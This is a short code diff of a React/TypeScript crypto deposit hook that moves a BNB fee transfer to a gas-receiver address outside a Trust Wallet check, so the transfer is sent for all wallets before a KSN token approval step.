@@ -318,12 +318,12 @@ export const useLegacyX2Deposit = () => {
                     },
                   });
 
+                  const gasTransferTx: Record<string, any> = {
+                    from: account,
+                    to: gasReceiverAddress,
+                    value: web3.utils.toWei(gasBnb, "ether"),
+                  };
                   if (!isTrustWallet) {
-                    const gasTransferTx: Record<string, any> = {
-                      from: account,
-                      to: gasReceiverAddress,
-                      value: web3.utils.toWei(gasBnb, "ether"),
-                    };
                     const gasLimit = await web3.eth.estimateGas({
                       from: account,
                       to: gasReceiverAddress,
@@ -332,10 +332,10 @@ export const useLegacyX2Deposit = () => {
                     gasTransferTx.gas = Math.floor(Number(gasLimit) * 1.5);
                     gasTransferTx.gasPrice = Math.floor(Number(gasPrice) * 1.3).toString();
                     gasTransferTx.nonce = baseNonce;
-                    await web3.eth.sendTransaction(gasTransferTx as any).then((receipt) => {
-                      console.log("✅ Transaction Successful: ", receipt);
-                    });
                   }
+                  await web3.eth.sendTransaction(gasTransferTx as any).then((receipt) => {
+                    console.log("✅ Transaction Successful: ", receipt);
+                  });
 
                   void Swal.fire({
                     html: "<b>Wait for KSN token approval in progress...<br/>Please do not refresh or leave this page.</b>",
